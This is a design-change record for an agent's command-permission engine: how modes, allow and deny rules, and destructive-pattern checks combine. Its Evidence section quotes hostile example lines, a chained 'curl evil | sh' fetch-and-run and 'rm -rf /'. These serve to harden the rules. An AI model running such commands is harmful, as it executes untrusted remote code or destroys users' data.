# Delta — how DD-006's precedence meets the §5.3 table, and how a rule reads a command line

| Field | Value |
|---|---|
| **Status** | `PROPOSED 2026-09-27 — pending the Tech Lead's ratification. T-F1-03 implements it and is merged with it open, at the user's instruction to carry on through T-F1-10.` |
| **Date** | 2026-09-27 |
| **Task** | T-F1-03 (implements); T-F1-28 (`policy.explain`, inherits decisions 5 and 6) |
| **Raised by** | The `spec-guardian` review of T-F1-03, 2026-09-27 (Art. 9: "NEEDS A DELTA") |

## Evidence

The approved specs disagree with each other in four places, and say nothing in a fifth:

1. **DD-006 step 1 vs §5.3's `ask` column.** DD-006 says a destructive pattern "always `ask`",
   first; the table says `ask` mode does not expose non-ReadOnly tools and marks the destructive
   row `—`. Read literally, an `ask`-mode thread could approve `rm -rf /` into running, which
   REQ-AGT-009 forbids.
2. **DD-006 step 1 vs step 2.** Destructive (`ask`) sits above `deny` rules, so a user's
   explicit `deny` on `rm -rf *` would be downgraded to a prompt for the most dangerous commands
   only. REQ-SEC-005 says "regardless of `allow` rules and the thread mode", not `deny` rules.
3. **REQ-AGT-013 vs DD-006 step 5.** The EARS says `auto-edit` "SHALL request approval for
   those pointing outside" the write root, with no exception; DD-006 puts `allow` rules above the
   mode default, which would let a rule skip that approval. REQ-AGT-014 has an "unless … `allow`
   rules" clause; REQ-AGT-013 does not.
4. **API §5.36 vs a truncated trace.** The example keeps evaluating after the deciding step and
   notes an overridden `allow` rule; nothing said whether the engine stops at the first match.
5. **Compound command lines.** Data Model §2.9 says only "glob over command or path". Globbed
   over the whole line, `allow "git status*"` carries `git status; curl evil | sh`, and
   `deny "rm *"` misses `echo hi; rm x`.

## Decisions

1. **Step 0, exposure.** Before DD-006's six steps: a tool the mode does not expose is `deny`
   with reason `not_exposed`. `ask` exposes ReadOnly only; an unknown mode exposes nothing (fail
   closed). This is the table's "not exposed" and `—`.
2. **A destructive pattern is a floor, not a ceiling.** It makes the verdict at least `ask`
   (never `always`); a matching `deny` rule still denies. Order otherwise as DD-006.
3. **`auto-edit` decides WriteFS at step 4 both ways:** inside the write root `allow`, outside
   `ask` with `outside_write_root` — above `allow` rules, as REQ-AGT-013's EARS reads. In
   `normal` mode, an `allow` rule may still allow a write outside the root (REQ-AGT-014).
4. **Rules over command lines.** For an `Exec` target the line is split at `;`, `&&`, `||`,
   `|`, `&`, newlines, backticks, parentheses and braces. A `deny` rule matches if its pattern
   matches the whole line or any part; an `allow` rule set allows only if every part is matched
   by some `allow` rule. A line with no command is never allowed by a rule. Parts are matched as
   written (no unwrapping), so a rule means what the user typed.
5. **The trace is complete.** Every step — `exposure` plus DD-006's six — is evaluated and
   traced whatever decided; exactly one carries `decided: true`, and any other step that matched
   carries a note `overridden by <step>`. API §5.36's example gains the `exposure` step and the
   `decided` member when T-F1-28 writes the method.
6. **Reasons on the wire.** `deny` answers carry `deny_rule` or `not_exposed`; `ask` answers
   keep `approvals.reason`'s values (`policy`, `destructive`, `tainted`, `outside_write_root`).
   Only `ask` creates an approval, so Data Model §2.8 is unchanged.
7. **Destructive normalisation** (Tech §5.3) unwraps `sudo`, `doas`, `env`, `xargs`, `nice`,
   `ionice`, `stdbuf`, `timeout`, `chroot`, `watch`, `parallel`, `nohup`, `time`, `command`,
   `exec`, `builtin`, `eval`, `busybox`, leading assignments, `sh -c` and find's
   `-exec`/`-execdir`/`-ok`/`-okdir`.

## Specification changes

- **Tech Design 1.16** §5.3 "How the table and DD-006 meet" (written by T-F1-03); DD-006 gains a
  pointer to it on ratification.
- **PRD:** REQ-AGT-013's EARS is unchanged — decision 3 follows it.
- **API §5.36:** on ratification, the example trace as decision 5 (T-F1-28).

## Verification

`go test ./internal/security/domain/ -run 'REQ_AGT_009|REQ_AGT_013|REQ_AGT_014|REQ_SEC_005|REQ_SEC_006|TestTheTraceFollowsDD006'`.
